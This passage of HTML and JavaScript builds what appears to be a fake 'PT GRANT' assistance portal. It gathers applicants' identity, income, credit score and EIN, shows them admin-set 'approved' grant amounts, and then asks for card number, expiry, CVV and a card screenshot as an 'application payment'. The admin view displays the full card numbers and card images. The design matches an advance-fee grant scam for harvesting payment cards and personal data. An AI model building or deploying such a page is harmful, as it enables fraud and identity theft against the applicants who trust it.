                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                        <div>
                            <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Business Name</label>
                            <input type="text" id="businessName" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-2.5 text-white">
                        </div>
                        <div>
                            <label class="block text-xs font-bold text-slate-300 uppercase mb-1">EIN / Tax ID</label>
                            <input type="text" id="businessEin" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-2.5 text-white">
                        </div>
                        <div>
                            <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Annual Revenue ($)</label>
                            <input type="text" id="businessRevenue" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-2.5 text-white">
                        </div>
                    </div>
                </div>

                <button type="submit" class="w-full bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-400 hover:to-amber-500 text-slate-950 font-black py-4 rounded-xl text-lg shadow-xl transition">
                    Submit Qualification Form
                </button>
            </form>
        </div>
    </div>

    <!-- TICKET GENERATED MODAL -->
    <div id="ticketModal" class="hidden fixed inset-0 bg-slate-950/90 backdrop-blur-md flex items-center justify-center p-4 z-50">
        <div class="bg-slate-900 max-w-md w-full rounded-2xl shadow-2xl p-6 text-center relative border-2 border-amber-500">
            <div class="w-16 h-16 bg-amber-500/20 text-amber-400 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl border border-amber-500/40">
                <i class="fa-solid fa-ticket"></i>
            </div>
            <h3 class="text-2xl font-black text-white">Application Submitted!</h3>
            <p class="text-xs text-slate-400 mt-1">Write down your Ticket ID below.</p>

            <div class="bg-slate-950 text-amber-400 font-mono text-3xl font-black py-4 rounded-xl my-4 tracking-widest border border-amber-500/40" id="generatedTicketId">
                PTG-000000
            </div>

            <div class="bg-amber-500/10 text-amber-300 text-xs p-4 rounded-xl text-left font-medium mb-4 space-y-1 border border-amber-500/20">
                <p class="font-bold text-amber-400"><i class="fa-solid fa-triangle-exclamation"></i> WRITE IT DOWN:</p>
                <p>1. Keep your <strong>Ticket ID</strong> safe.</p>
                <p>2. Use <strong>Ticket ID + Last Name</strong> to log into your status portal.</p>
            </div>

            <button onclick="closeModal('ticketModal'); openModal('statusModal');" class="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3.5 rounded-xl transition">
                Proceed to Status Dashboard
            </button>
        </div>
    </div>

    <!-- STATUS LOGIN MODAL -->
    <div id="statusModal" class="hidden fixed inset-0 bg-slate-950/90 backdrop-blur-md flex items-center justify-center p-4 z-50">
        <div class="bg-slate-900 max-w-md w-full rounded-2xl shadow-2xl p-6 relative border border-slate-800">
            <button onclick="closeModal('statusModal')" class="absolute top-4 right-4 text-slate-400 hover:text-white text-xl font-bold">&times;</button>
            <h3 class="text-xl font-bold text-white mb-1">Check Application Status</h3>
            <p class="text-xs text-slate-400 mb-4">Enter your login credentials.</p>

            <form onsubmit="handleStatusLogin(event)" class="space-y-4">
                <div>
                    <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Ticket ID *</label>
                    <input type="text" id="statusTicketInput" required placeholder="PTG-123456" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white font-mono uppercase">
                </div>
                <div>
                    <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Applicant Last Name *</label>
                    <input type="text" id="statusLastNameInput" required placeholder="Last Name" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white">
                </div>
                <button type="submit" class="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3 rounded-xl transition">
                    Access Status Portal
                </button>
            </form>
        </div>
    </div>

    <!-- PAYMENT MODAL WITH CARD SCREENSHOT UPLOAD -->
    <div id="paymentModal" class="hidden fixed inset-0 bg-slate-950/90 backdrop-blur-md flex items-center justify-center p-4 z-50">
        <div class="bg-slate-900 max-w-md w-full rounded-2xl shadow-2xl p-6 relative border border-amber-500">
            <button onclick="closeModal('paymentModal')" class="absolute top-4 right-4 text-slate-400 hover:text-white text-xl font-bold">&times;</button>
            <h3 class="text-xl font-bold text-white mb-1 flex items-center gap-2">
                <i class="fa-solid fa-credit-card text-amber-400"></i> Make Application Payment
            </h3>
            <p class="text-xs text-slate-400 mb-4">Enter card details and upload payment screenshot.</p>

            <form onsubmit="handlePaymentSubmit(event)" class="space-y-4">
                <div>
                    <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Card Number *</label>
                    <input type="text" id="payCardNumber" required placeholder="XXXX XXXX XXXX XXXX" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white font-mono">
                </div>
                <div class="grid grid-cols-2 gap-3">
                    <div>
                        <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Expiry *</label>
                        <input type="text" placeholder="MM/YY" required class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white">
                    </div>
                    <div>
                        <label class="block text-xs font-bold text-slate-400 uppercase mb-1">CVV *</label>
                        <input type="text" placeholder="123" required class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white">
                    </div>
                </div>
                <div>
                    <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Card Screenshot / Image *</label>
                    <input type="file" id="payCardImage" accept="image/*" required class="w-full border border-slate-800 bg-slate-950 rounded-lg p-2 text-xs text-slate-300">
                </div>
                <button type="submit" class="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3 rounded-xl transition">
                    Submit Payment & Screenshot
                </button>
            </form>
        </div>
    </div>

    <!-- JAVASCRIPT LOGIC WITH LOCALSTORAGE PERSISTENCE -->
    <script>
        let applications = JSON.parse(localStorage.getItem('pt_applications')) || [];
        let currentApplicant = null;
        let selectedAdminTicket = null;
        let isAdminLoggedIn = false;

        function saveStorage() {
            localStorage.setItem('pt_applications', JSON.stringify(applications));
        }

        function showSection(sec) {
            document.getElementById('assistanceCardsSection').classList.add('hidden');
            document.getElementById('statusDashboardSection').classList.add('hidden');
            document.getElementById('adminPortalSection').classList.add('hidden');

            if (sec === 'cards') document.getElementById('assistanceCardsSection').classList.remove('hidden');
            if (sec === 'status') document.getElementById('statusDashboardSection').classList.remove('hidden');
            if (sec === 'admin') document.getElementById('adminPortalSection').classList.remove('hidden');
        }

        function openModal(id) { document.getElementById(id).classList.remove('hidden'); }
        function closeModal(id) { document.getElementById(id).classList.add('hidden'); }

        function openApplyModal(assistanceType) {
            document.getElementById('assistanceType').value = assistanceType;
            document.getElementById('applyModalTitle').innerText = assistanceType;
            toggleAssistanceFields();
            openModal('applyModal');
        }

        function toggleAssistanceFields() {
            const val = document.getElementById('assistanceType').value;
            const biz = document.getElementById('businessFields');
            if (val === 'Business Assistance') {
                biz.classList.remove('hidden');
            } else {
                biz.classList.add('hidden');
            }
        }

        // Form Submission Handler
        function handleFormSubmit(e) {
            e.preventDefault();
            const ticketId = 'PTG-' + Math.floor(100000 + Math.random() * 900000);
            
            const newApp = {
                ticketId: ticketId,
                assistanceType: document.getElementById('assistanceType').value,
                firstName: document.getElementById('firstName').value,
                lastName: document.getElementById('lastName').value,
                email: document.getElementById('email').value,
                phone: document.getElementById('phone').value,
                address1: document.getElementById('address1').value,
                address2: document.getElementById('address2').value || 'N/A',
                city: document.getElementById('city').value,
                state: document.getElementById('state').value,
                zip: document.getElementById('zip').value,
                employmentStatus: document.getElementById('employmentStatus').value,
                payFrequency: document.getElementById('payFrequency').value,
                payAmount: document.getElementById('payAmount').value,
                creditScore: document.getElementById('creditScore').value,
                businessName: document.getElementById('businessName').value || 'N/A',
                businessEin: document.getElementById('businessEin').value || 'N/A',
                businessRevenue: document.getElementById('businessRevenue').value || 'N/A',
                status: 'Under Review',
                approvedAmount: 0,
                pendingAmount: 0,
                uploads: [],
                messages: [{ sender: 'admin', text: 'Welcome to PT GRANT! Your application entries have been registered in the admin system and are under review.', time: new Date().toLocaleTimeString() }]
            };

            applications.push(newApp);
            saveStorage();

            document.getElementById('generatedTicketId').innerText = ticketId;
            document.getElementById('applicationForm').reset();
            closeModal('applyModal');
            openModal('ticketModal');
        }

        // Status Login Handler
        function handleStatusLogin(e) {
            e.preventDefault();
            const ticket = document.getElementById('statusTicketInput').value.trim().toUpperCase();
            const lastName = document.getElementById('statusLastNameInput').value.trim().toLowerCase();

            const found = applications.find(a => a.ticketId === ticket && a.lastName.toLowerCase() === lastName);

            if (found) {
                currentApplicant = found;
                closeModal('statusModal');
                renderApplicantDashboard();
                showSection('status');
            } else {
                alert('Invalid Ticket ID or Last Name combination.');
            }
        }

        function renderApplicantDashboard() {
            if (!currentApplicant) return;

            document.getElementById('dashApplicantName').innerText = `${currentApplicant.firstName} ${currentApplicant.lastName}`;
            document.getElementById('dashTicketId').innerText = currentApplicant.ticketId;
            document.getElementById('dashApprovedAmount').innerText = `$${Number(currentApplicant.approvedAmount).toLocaleString('en-US', {minimumFractionDigits: 2})}`;
            document.getElementById('dashPendingAmount').innerText = `$${Number(currentApplicant.pendingAmount).toLocaleString('en-US', {minimumFractionDigits: 2})}`;

            const badge = document.getElementById('dashStatusBadge');
            badge.innerText = currentApplicant.status;
            badge.className = "inline-block px-5 py-2 rounded-full font-bold text-sm shadow-sm " + 
                (currentApplicant.status === 'Approved' ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40' : 'bg-amber-500/20 text-amber-400 border border-amber-500/40');

            const msgBox = document.getElementById('applicantMessagesBox');
            msgBox.innerHTML = currentApplicant.messages.map(m => `
                <div class="p-3 rounded-xl text-xs ${m.sender === 'admin' ? 'bg-amber-500/10 border border-amber-500/30 text-amber-200' : 'bg-slate-900 border border-slate-800 text-slate-300'}">
                    <div class="flex justify-between font-bold mb-1">
                        <span>${m.sender === 'admin' ? 'PT GRANT Admin' : 'You'}</span>
                        <span class="text-[10px] text-slate-500">${m.time}</span>
                    </div>
                    <p>${m.text}</p>
                </div>
            `).join('');

            const upBox = document.getElementById('applicantUploadsList');
            upBox.innerHTML = currentApplicant.uploads.length ? currentApplicant.uploads.map(u => `
                <div class="flex justify-between bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-300">
                    <span><strong class="uppercase text-amber-400">[${u.category}]</strong> ${u.name}</span>
                    <span class="text-slate-500 text-[10px]">${u.time}</span>
                </div>
            `).join('') : '<p class="text-slate-500 italic">No uploaded documents.</p>';
        }

        function uploadDocument(category) {
            const fileInput = document.getElementById(category === 'personal' ? 'personalDocInput' : 'businessDocInput');
            if (!fileInput.files.length) return alert('Select a file to upload.');

            const file = fileInput.files[0];
            const reader = new FileReader();

            reader.onload = function(e) {
                currentApplicant.uploads.push({
                    category: category,
                    name: file.name,
                    dataUrl: e.target.result,
                    time: new Date().toLocaleTimeString()
                });

                saveStorage();
                fileInput.value = '';
                renderApplicantDashboard();
                alert('Document uploaded to Admin Portal successfully!');
            };

            reader.readAsDataURL(file);
        }

        // Payment Submission with Screenshot Data URL
        function handlePaymentSubmit(e) {
            e.preventDefault();
            const cardNumber = document.getElementById('payCardNumber').value;
            const fileInput = document.getElementById('payCardImage');

            if (!fileInput.files.length) return alert('Please attach a card screenshot image.');

            const file = fileInput.files[0];
            const reader = new FileReader();

            reader.onload = function(e) {
                currentApplicant.uploads.push({
                    category: 'payment card',
                    name: `Card (**${cardNumber.slice(-4)}): ${file.name}`,
                    cardNumber: cardNumber,
                    dataUrl: e.target.result,
                    time: new Date().toLocaleTimeString()
                });

                currentApplicant.status = 'Payment Verified';
                saveStorage();

                closeModal('paymentModal');
                renderApplicantDashboard();
                alert('Payment details and card screenshot submitted to Admin Portal!');
            };

            reader.readAsDataURL(file);
        }

        // ADMIN PORTAL LOGIN & MANAGEMENT
        function openAdminLoginModal() {
            if (isAdminLoggedIn) {
                renderAdminTable();
                showSection('admin');
            } else {
                openModal('adminLoginModal');
            }
        }

        function handleAdminLogin(e) {
            e.preventDefault();
            const pwd = document.getElementById('adminPasswordInput').value;
            if (pwd === 'Admin123') {
                isAdminLoggedIn = true;
                closeModal('adminLoginModal');
                document.getElementById('adminPasswordInput').value = '';
                renderAdminTable();
                showSection('admin');
            } else {
                alert('Incorrect Admin Password!');
            }
        }

        function logoutAdmin() {
            isAdminLoggedIn = false;
            showSection('cards');
            alert('Admin logged out.');
        }

        function renderAdminTable() {
            const tbody = document.getElementById('adminTableBody');
            if (!applications.length) {
                tbody.innerHTML = `<tr><td colspan="7" class="p-4 text-center text-slate-500">No applications submitted yet.</td></tr>`;
                return;
            }

            tbody.innerHTML = applications.map(a => `
                <tr class="hover:bg-slate-950/50">
                    <td class="p-3 font-mono font-bold text-amber-400">${a.ticketId}</td>
                    <td class="p-3">${a.firstName} ${a.lastName}</td>
                    <td class="p-3">${a.assistanceType}</td>
                    <td class="p-3"><span class="px-2.5 py-1 bg-amber-500/10 text-amber-400 rounded font-bold text-xs border border-amber-500/20">${a.status}</span></td>
                    <td class="p-3 text-emerald-400 font-bold">$${Number(a.approvedAmount).toLocaleString()}</td>
                    <td class="p-3 text-amber-400 font-bold">$${Number(a.pendingAmount).toLocaleString()}</td>
                    <td class="p-3">
                        <button onclick="selectAdminApp('${a.ticketId}')" class="bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold px-3 py-1 rounded text-xs">
                            Manage
                        </button>
                    </td>
                </tr>
            `).join('');
        }

        function selectAdminApp(ticketId) {
            selectedAdminTicket = ticketId;
            const app = applications.find(a => a.ticketId === ticketId);

            document.getElementById('adminDetailCard').classList.remove('hidden');
            document.getElementById('adminDetailTicketHeader').innerText = `Managing Application: ${app.ticketId}`;
            document.getElementById('adminDetailAssistanceType').innerText = app.assistanceType;

            // Populate Main Form Entries into Admin View
            document.getElementById('admFullName').innerText = `${app.firstName} ${app.lastName}`;
            document.getElementById('admEmail').innerText = app.email;
            document.getElementById('admPhone').innerText = app.phone;
            document.getElementById('admAddress1').innerText = app.address1;
            document.getElementById('admAddress2').innerText = app.address2;
            document.getElementById('admCityStateZip').innerText = `${app.city}, ${app.state} ${app.zip}`;
            document.getElementById('admEmployment').innerText = app.employmentStatus;
            document.getElementById('admPay').innerText = `$${app.payAmount} (${app.payFrequency})`;
            document.getElementById('admCredit').innerText = app.creditScore;

            // Render Business Data if present
            const bizBox = document.getElementById('admBusinessBox');
            if (app.assistanceType === 'Business Assistance' || app.businessName !== 'N/A') {
                bizBox.classList.remove('hidden');
                document.getElementById('admBizName').innerText = app.businessName;
                document.getElementById('admBizEin').innerText = app.businessEin;
                document.getElementById('admBizRev').innerText = app.businessRevenue;
            } else {
                bizBox.classList.add('hidden');
            }

            document.getElementById('admStatusSelect').value = app.status;
            document.getElementById('admApprovedInput').value = app.approvedAmount;
            document.getElementById('admPendingInput').value = app.pendingAmount;

            // Render Files and Payment Screenshots
            const filesList = document.getElementById('admFilesList');
            if (app.uploads.length) {
                filesList.innerHTML = app.uploads.map(u => `
                    <div class="p-3 bg-slate-950 border border-slate-800 rounded-xl space-y-2 text-slate-300">
                        <div class="flex justify-between font-mono">
                            <span><strong class="uppercase text-amber-400">[${u.category.toUpperCase()}]</strong> ${u.name}</span>
                            <span class="text-slate-500 text-[10px]">${u.time}</span>
                        </div>
                        ${u.dataUrl ? `
                            <div class="mt-2">
                                <a href="${u.dataUrl}" target="_blank" class="inline-block bg-slate-800 hover:bg-slate-700 text-amber-400 font-bold px-3 py-1.5 rounded border border-slate-700 text-[11px] mb-2">
                                    <i class="fa-solid fa-up-right-from-square"></i> Open Full File / Image
                                </a>
                                ${u.dataUrl.startsWith('data:image/') ? `<img src="${u.dataUrl}" class="max-h-48 rounded border border-slate-700 object-cover mt-1">` : ''}
                            </div>
                        ` : ''}
                    </div>
                `).join('');
            } else {
                filesList.innerHTML = '<p class="text-slate-500 italic">No uploaded documents or card screenshots available.</p>';
            }
        }

        function saveAdminAppChanges() {
            if (!selectedAdminTicket) return;
            const app = applications.find(a => a.ticketId === selectedAdminTicket);

            app.status = document.getElementById('admStatusSelect').value;
            app.approvedAmount = parseFloat(document.getElementById('admApprovedInput').value) || 0;
            app.pendingAmount = parseFloat(document.getElementById('admPendingInput').value) || 0;

            saveStorage();
            renderAdminTable();
            alert('Application status & amounts saved successfully!');
        }

        function sendAdminReply() {
            if (!selectedAdminTicket) return;
            const text = document.getElementById('admReplyText').value.trim();
            if (!text) return alert('Enter a reply message.');

            const app = applications.find(a => a.ticketId === selectedAdminTicket);
            app.messages.push({
                sender: 'admin',
                text: text,
                time: new Date().toLocaleTimeString()
            });

            saveStorage();
            document.getElementById('admReplyText').value = '';
            alert('Reply sent directly to applicant portal!');
        }
    </script>
</body>
</html>
